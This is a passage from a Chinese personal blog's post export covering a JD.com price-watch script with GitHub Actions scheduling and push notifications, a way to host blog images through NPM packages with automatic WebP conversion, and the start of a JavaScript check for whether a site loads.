lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 发布 NPM 包</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Publish</span> <span class=\"string\">Package</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--global</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">version</span> <span class=\"string\">patch</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">publish</span></span><br><span class=\"line\">        <span class=\"attr\">env:</span></span><br><span class=\"line\">          <span class=\"attr\">NODE_AUTH_TOKEN:</span> <span class=\"string\">${{secrets.npm_token}}</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"comment\"># 删除 rawimg/ 和 webpimg/ 下的所有文件</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Delete</span> <span class=\"string\">Files</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">webpimg/*</span></span><br><span class=\"line\">          <span class=\"string\">rm</span> <span class=\"string\">-rf</span> <span class=\"string\">rawimg/*</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">webpimg/.gitkeep</span></span><br><span class=\"line\">          <span class=\"string\">touch</span> <span class=\"string\">rawimg/.gitkeep</span></span><br><span class=\"line\">          </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-m</span> <span class=\"string\">\"Publish\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E4%BD%BF%E7%94%A8\" class=\"headerlink\" title=\"使用\"></a>使用</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%8A%E4%BC%A0\" class=\"headerlink\" title=\"上传\"></a>上传</h3>\n<p>将图片文件上传至仓库的 <code>rawimg/</code> 文件夹下即可。</p>\n<p>当然也可以使用 PicGo / UPic / HexoPlusPlus 等工具上传。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"发布\"></a>发布</h3>\n<p>在 GitHub 中新建 Release，将自动修改版本号并发布 NPM 包，无需手动修改 <code>package.json</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/t2afFy.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/0wAmRV.png\"></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%AE%BF%E9%97%AE\" class=\"headerlink\" title=\"访问\"></a>访问</h3>\n<h4>\n<a href=\"https://blog.yfun.top/#%E6%8E%A8%E8%8D%90%E7%9A%84%E9%95%9C%E5%83%8F\" class=\"headerlink\" title=\"推荐的镜像\"></a>推荐的镜像</h4>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/  <span class=\"comment\"># jsDelivr</span></span><br><span class=\"line\">https://unpkg.zhimg.com/ <span class=\"comment\"># 知乎</span></span><br><span class=\"line\">https://code.bdstatic.com/npm/ <span class=\"comment\"># 百度 (不推荐)</span></span><br><span class=\"line\">https://shadow.elemecdn.com/npm/ <span class=\"comment\"># 饿了么</span></span><br><span class=\"line\">https://unpkg.com/ <span class=\"comment\"># Unpkg</span></span><br></pre></td></tr></table></figure><p>镜像推荐选择访问速度快的，比较稳定的，拉取速度快的。</p>\n<p>我选择的是 jsDelivr，国内外速度都很优秀。</p>\n<h4>\n<a href=\"https://blog.yfun.top/#%E9%93%BE%E6%8E%A5\" class=\"headerlink\" title=\"链接\"></a>链接</h4>\n<p>以 jsDelivr 为例，原图链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].[suffix]</span><br></pre></td></tr></table></figure><p>WebP 图片链接为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://cdn.jsdelivr.net/npm/[package-name]@[version]/rawimg/[filename].webp</span><br></pre></td></tr></table></figure><table>\n<thead><tr>\n<th>[值]</th>\n<th>说明</th>\n</tr></thead>\n<tbody>\n<tr>\n<td><code>package-name</code></td>\n<td>NPM 包的名称 (<code>package.json</code> 文件中 <code>name</code> 的值)</td>\n</tr>\n<tr>\n<td><code>version</code></td>\n<td>当前版本 (<code>package.json</code> 文件中 <code>version</code> 的值，通常需要在发布 Release 1 分钟后更新)</td>\n</tr>\n<tr>\n<td><code>filename</code></td>\n<td>文件名</td>\n</tr>\n<tr>\n<td><code>suffix</code></td>\n<td>文件后缀名</td>\n</tr>\n</tbody>\n</table>\n","link":"https://blog.yfun.top/posts/2876015612/"},{"title":"使用 JS 检测网址能否正常加载","date":"2021-04-09 12:42:00","description":"\n<p>有时我们需要判断用户能否加载某些网页或服务，如 Google、Disqus 等。</p>\n<p>而我们可以用 JavaScript 来实现这样的检测功能。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%B8%80\" class=\"headerlink\" title=\"方法一\"></a>方法一</h2>\n<p>使用 JavaScript 创建一个图片，设置图片的链接为 检测网址 + <code>favicon.ico</code>。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建一个图片</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> img = <span class=\"keyword\">new</span> Image();</span><br><span class=\"line\"><span class=\"comment\">// 设置图片的链接</span></span><br><span class=\"line\">img.src = <span class=\"string\">\"https://google.com/favicon.ico\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">img.onerror = img.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span 